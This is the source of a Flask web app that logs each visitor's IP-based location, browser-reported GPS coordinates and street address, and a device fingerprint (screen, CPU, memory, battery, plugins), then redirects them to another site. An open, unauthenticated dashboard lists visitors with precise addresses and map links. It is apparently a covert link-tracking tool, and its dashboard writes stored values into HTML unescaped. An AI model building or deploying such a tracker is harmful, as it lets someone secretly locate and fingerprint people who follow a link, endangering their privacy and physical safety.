
import os
import sqlite3
import json
import requests
from flask import Flask, send_file, request, redirect
from datetime import datetime

app = Flask(__name__)
DATABASE = 'visitors.db'

def init_db():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS visitors (
            ip_address TEXT PRIMARY KEY,
            last_visit TEXT,
            location TEXT,
            latitude REAL,
            longitude REAL,
            ip_location_info TEXT,
            user_agent TEXT,
            screen_resolution TEXT,
            language TEXT,
            platform TEXT,
            device_pixel_ratio TEXT,
            cpu_cores INTEGER,
            memory TEXT,
            connection_info TEXT,
            battery_info TEXT,
            plugins TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.route("/")
def index():
    return send_file('src/index.html')

@app.route('/track', methods=['POST'])
def track_and_redirect():
    ip_address = request.remote_addr
    if ip_address == '127.0.0.1':
        try:
            ip_address = requests.get('https://api.ipify.org').text
        except requests.RequestException:
            ip_address = '127.0.0.1'
        
    user_agent = request.headers.get('User-Agent')
    data = request.get_json() or {}
    
    ip_location_info = {}
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}')
        if response.status_code == 200:
            ip_location_info = response.json()
    except requests.RequestException:
        ip_location_info = {"error": "Failed to fetch IP location"}

    db_data = {
        "ip_address": ip_address,
        "last_visit": datetime.now().isoformat(),
        "location": json.dumps(data.get('address', {})),
        "latitude": data.get('latitude'),
        "longitude": data.get('longitude'),
        "user_agent": user_agent,
        "screen_resolution": data.get('screen_resolution'),
        "language": data.get('language'),
        "platform": data.get('platform'),
        "device_pixel_ratio": str(data.get('device_pixel_ratio')),
        "cpu_cores": data.get('cpu_cores'),
        "memory": str(data.get('memory')),
        "connection_info": json.dumps(data.get('connection')),
        "battery_info": json.dumps(data.get('battery')),
        "plugins": json.dumps(data.get('plugins')),
        "ip_location_info": json.dumps(ip_location_info)
    }

    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    columns = ', '.join(db_data.keys())
    placeholders = ', '.join('?' * len(db_data))
    sql = f"INSERT OR REPLACE INTO visitors ({columns}) VALUES ({placeholders})"
    
    cursor.execute(sql, list(db_data.values()))
    conn.commit()
    conn.close()

    return redirect("https://intelleva.app")

@app.route("/dashboard")
def dashboard():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM visitors ORDER BY last_visit DESC")
    visitors = cursor.fetchall()
    conn.close()

    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Live Visitor Dashboard</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --color-bg: #1a202c;
                --color-bg-light: #2d3748;
                --color-border: #4a5568;
                --color-text: #e2e8f0;
                --color-text-light: #a0aec0;
                --color-primary: #38b2ac;
                --color-allowed: #48bb78;
                --color-denied: #f56565;
            }
            body { 
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
                background-color: var(--color-bg);
                color: var(--color-text);
                margin: 0;
                padding: 2rem;
            }
            h1 { text-align: center; color: var(--color-primary); font-weight: 700; }
            .table-container { overflow-x: auto; }
            table {
                width: 100%;
                border-collapse: separate;
                border-spacing: 0;
                font-size: 0.875rem;
                box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -2px rgba(0,0,0,0.05);
                border-radius: 0.5rem;
                overflow: hidden;
            }
            th, td {
                padding: 1rem 1.25rem;
                border-bottom: 1px solid var(--color-border);
                text-align: left;
                vertical-align: top;
                white-space: nowrap;
            }
            thead th {
                background-color: var(--color-bg-light);
                color: var(--color-text);
                font-weight: 600;
                text-transform: uppercase;
                letter-spacing: 0.05em;
            }
            tbody tr {
                 transition: background-color 0.2s ease-in-out;
            }
            tbody tr:nth-child(even) { background-color: var(--color-bg); }
            tbody tr:nth-child(odd) { background-color: var(--color-bg-light); }
            tbody tr:hover { background-color: #4a5568; }
            pre { white-space: pre-wrap; word-wrap: break-word; margin: 0; font-size: 0.8rem; background-color: var(--color-bg); padding: 0.5rem; border-radius: 0.3rem; max-height: 200px; overflow-y: auto; }
            .status { font-weight: bold; text-align: center; }
            .allowed { color: var(--color-allowed); }
            .denied { color: var(--color-denied); }
            .map-link a { color: var(--color-primary); text-decoration: none; font-weight: 600; transition: color 0.2s; }
            .map-link a:hover { color: #64d8d3; }
            .no-visitors { text-align: center; padding: 2rem; }
        </style>
    </head>
    <body>
        <h1>Live Visitor Dashboard</h1>
        <div class="table-container">
            <table>
                <thead><tr>
    """
    
    if not visitors:
        html += "<th class='no-visitors'>No visitors have been recorded yet.</th></tr></thead></table></div></body></html>"
        return html

    display_columns = [
        ("gps_permission", "GPS Status"),
        ("map_link", "Map Link"),
        ("estimated_location", "Estimated Location (IP)"),
        ("last_visit", "Last Visit"),
        ("ip_address", "IP Address"),
        ("location", "Precise Address (GPS)"),
        ("user_agent", "User Agent"),
    ]

    for _, col_name in display_columns:
        html += f"<th>{col_name}</th>"
    html += "</tr></thead><tbody>"

    for visitor in visitors:
        html += "<tr>"
        for col_key, _ in display_columns:
            if col_key == "gps_permission":
                html += f'<td class="status { "allowed" if visitor["latitude"] else "denied" }">{"Allowed" if visitor["latitude"] else "Denied"}</td>'
            
            elif col_key == "map_link":
                if visitor['latitude'] and visitor['longitude']:
                    map_url = f"https://www.google.com/maps?q={visitor['latitude']},{visitor['longitude']}"
                    html += f'<td class="map-link"><a href="{map_url}" target="_blank">Open Map</a></td>'
                else:
                    html += "<td>N/A</td>"

            elif col_key == "estimated_location":
                value = visitor["ip_location_info"]
                display_text = "N/A"
                if value and value.startswith('{'):
                    try:
                        ip_info = json.loads(value)
                        city = ip_info.get('city')
                        state = ip_info.get('regionName')
                        display_text = ", ".join(filter(None, [city, state])) or "N/A"
                    except json.JSONDecodeError:
                        display_text = "Invalid Data"
                html += f"<td>{display_text}</td>"

            elif col_key == "location":
                value = visitor[col_key]
                display_text = "N/A"
                if value and value.startswith('{'):
                    try:
                        addr = json.loads(value)
                        if addr:
                            city_name = addr.get('city') or addr.get('town') or addr.get('village')
                            display_text = ", ".join(filter(None, [addr.get('road'), city_name, addr.get('state')])) or "Details unavailable"
                    except (json.JSONDecodeError, AttributeError):
                        display_text = "Invalid Data"
                html += f"<td>{display_text}</td>"

            else:
                value = visitor[col_key]
                html += f"<td>{value or 'N/A'}</td>"
        html += "</tr>"

    html += "</tbody></table></div></body></html>"
    return html

@app.route("/script.js")
def script():
    return send_file('src/script.js')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
